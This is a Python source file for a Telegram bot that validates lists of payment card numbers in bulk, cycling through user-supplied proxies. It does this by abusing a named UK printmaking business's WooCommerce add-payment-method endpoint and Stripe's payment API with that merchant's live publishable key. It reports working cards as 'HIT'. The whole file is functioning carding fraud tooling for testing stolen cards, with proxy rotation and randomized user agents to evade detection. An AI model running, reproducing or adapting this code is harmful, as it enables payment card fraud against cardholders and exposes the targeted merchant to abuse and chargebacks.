import asyncio
import os
import re
import json
import uuid
import aiohttp
import aiofiles
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiohttp import web
from fake_useragent import UserAgent

# --- CONFIGURATION ---
API_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
PORT = int(os.getenv('PORT', 10000))
USER_FILE = 'authorized_users.json'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
ua = UserAgent()

# --- STATE ---
PROXIES = []
AUTHORIZED_USERS = {ADMIN_ID} if ADMIN_ID != 0 else set()

if os.path.exists(USER_FILE):
    try:
        with open(USER_FILE, 'r') as f:
            AUTHORIZED_USERS.update(json.load(f))
    except Exception:
        pass

def save_users():
    with open(USER_FILE, 'w') as f:
        json.dump(list(AUTHORIZED_USERS), f)

class ProxyRotator:
    def __init__(self):
        self.index = 0
    def get_next(self):
        if not PROXIES: return None
        proxy = PROXIES[self.index]
        self.index = (self.index + 1) % len(PROXIES)
        return proxy

rotator = ProxyRotator()

# ────────────────────────── STRIPE CORE ──────────────────────────

async def process_stripe_card(card_line, proxy_url):
    try:
        parts = card_line.split('|')
        if len(parts) < 4: return False, "Format Error"
        cc, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
        domain = "https://www.eastlondonprintmakers.co.uk"

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            # 1. Get Nonce
            async with session.get(site_url, headers={'User-Agent': ua.random}, proxy=proxy_url, timeout=20) as r:
                text = await r.text()
            
            pk = "pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv"
            nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"(.*?)"', text)
            nonce = nonce_match.group(1) if nonce_match else ""

            # 2. Create Payment Method
            stripe_payload = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'key': pk,
                '_stripe_version': '2026-04-22',
                'guid': str(uuid.uuid4()),
                'muid': str(uuid.uuid4()),
                'sid': str(uuid.uuid4())
            }
            
            async with session.post('https://api.stripe.com/v1/payment_methods', data=stripe_payload, proxy=proxy_url) as r:
                pm_json = await r.json()
            
            if 'error' in pm_json: return False, pm_json['error']['message']
            pm_id = pm_json['id']

            # 3. Confirm
            confirm_data = {
                'wc-stripe-payment-method': pm_id,
                '_ajax_nonce': nonce,
                'wc-stripe-payment-type': 'card'
            }
            ajax_url = f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            async with session.post(ajax_url, data=confirm_data, proxy=proxy_url) as r:
                res = await r.json()

            if res.get('success'): return True, "Approved (Succeeded)"
            if 'verification_url' in str(res) or 'requires_action' in str(res): 
                return True, "Approved (3DS Required)"
            
            err = res.get('data', {}).get('error', {}).get('message', 'Declined')
            return False, err
    except Exception as e:
        return False, f"Error: {str(e)}"

# ────────────────────────── BOT HANDLERS ──────────────────────────

@dp.message_handler(commands=['start'])
async def start(m: types.Message):
    if m.from_user.id not in AUTHORIZED_USERS: return
    await m.reply("✅ **Checker Active**\n• Send `proxies.txt` first\n• Send `cards.txt` to check")

@dp.message_handler(commands=['add'])
async def add(m: types.Message):
    if m.from_user.id != ADMIN_ID: return
    try:
        uid = int(m.get_args())
        AUTHORIZED_USERS.add(uid)
        save_users()
        await m.reply(f"👤 Authorized: {uid}")
    except: await m.reply("Usage: `/add ID`")

@dp.message_handler(content_types=types.ContentType.DOCUMENT)
async def handle_file(m: types.Message):
    global PROXIES
    if m.from_user.id not in AUTHORIZED_USERS: return
    
    file_name = m.document.file_name
    path = f"downloads/{file_name}"
    await m.document.download(destination_file=path)

    if "proxy" in file_name.lower():
        async with aiofiles.open(path, 'r') as f:
            lines = await f.readlines()
            PROXIES = [l.strip() for l in lines if l.strip()]
        await m.reply(f"🔄 Loaded {len(PROXIES)} proxies.")

    elif file_name.endswith('.txt'):
        await m.reply("🚀 Checking...")
        async with aiofiles.open(path, 'r') as f:
            content = await f.read()
            cards = content.strip().split('\n')

        for c in cards:
            if not c.strip(): continue
            live, res = await process_stripe_card(c.strip(), rotator.get_next())
            if live:
                await bot.send_message(m.chat.id, f"✅ **HIT**\n<code>{c}</code>\n💬 {res}", parse_mode="HTML")
        await m.reply("🏁 Finished.")

# ────────────────────────── RENDER SETUP ──────────────────────────

async def handle_web(request):
    return web.Response(text="Bot Alive")

async def on_startup(dp):
    if not os.path.exists('downloads'): os.makedirs('downloads')
    app = web.Application()
    app.router.add_get('/', handle_web)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', PORT).start()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
